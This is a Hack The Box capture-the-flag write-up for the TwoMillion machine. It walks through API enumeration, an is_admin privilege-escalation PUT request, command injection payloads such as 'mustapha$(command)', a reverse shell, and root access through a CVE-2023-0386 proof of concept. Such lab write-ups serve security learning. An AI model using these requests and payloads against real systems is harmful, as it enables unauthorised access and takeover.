

# 1️⃣ TwoMillion Writeup

# 🧑‍💻 Hack The Box – TwoMillion

## Enumeration

Start by scanning the target:

```bash
nmap -sC -sV 2million.htb
````

Open ports discovered:

* **22 → SSH**
* **80 → HTTP**

---

## Website Analysis

After inspecting the website, a **JavaScript file** was discovered containing several functions.

One interesting function:

```
makeInviteCode()
```

This function generates **invite codes**.

The returned data was:

* **Base64 encoded**
* Inside another object using **ROT13 encoding**

---

## Generating an Invite Code

The API endpoint responsible for generating invites:

```
/api/v1/invite/generate
```

Using `curl`:

```bash
curl -X POST http://2million.htb/api/v1/invite/generate
```

Example response:

```json
{
  "0":200,
  "success":1,
  "data":{
    "code":"N0xCQ0EtOE05TUgtQlkwRUYtRVUzOEM=",
    "format":"encoded"
  }
}
```

Decoding the invite allowed **registration on the platform**.

---

## API Enumeration

While browsing the dashboard we noticed:

* **Access**
* **Changelog**

Intercepting requests with **Burp Suite** revealed additional API routes.

Example:

```
/api/v1/admin
```

Another interesting route:

```
/api/v1/admin/settings/update
```

---

## Privilege Escalation (Web)

The endpoint allowed modification of account settings.

A PUT request was used to attempt privilege escalation.

Example request:

```bash
curl -X PUT http://2million.htb/api/v1/admin/settings/update \
--cookie "PHPSESSID=SESSIONID" \
--header "Content-Type: application/json" \
--data '{"email":"your@email.com","is_admin":1}'
```

After modifying the request properly, the account gained **admin privileges**.

---

## Command Injection

Testing user input revealed a **command injection vulnerability**.

Example payload:

```
$(sleep 2)
```

If the response delayed → injection confirmed.

Example malicious payloads:

```
mustapha && command #
mustapha$(command)
```

This vulnerability allowed **Remote Code Execution (RCE)**.

---

## Reverse Shell

Once command execution was confirmed, a reverse shell was obtained.

---

## Post Exploitation

An `.env` file was discovered containing **database credentials**.

However this was a **decoy**.

The actual sensitive file was located at:

```
/home/admin
```

The **user flag** was found there.

---

## Mail Discovery

Linux mail location:

```
/var/mail
```

Inside the mailbox we discovered references to the vulnerability:

```
CVE-2023-0386
```

---

## Privilege Escalation

A public PoC was available.

Steps:

```bash
cd /tmp
nano poc.c
```

Paste exploit code.

Compile:

```bash
gcc poc.c -o poc -D_FILE_OFFSET_BITS=64 -static -lfuse -ldl
```

Execute:

```bash
chmod +x poc
./poc
```

Root access obtained.

---

## Flags

```
user.txt
root.txt
```

---

## Skills Learned

* API enumeration
* Burp Suite request analysis
* Command injection
* Reverse shells
* Linux privilege escalation

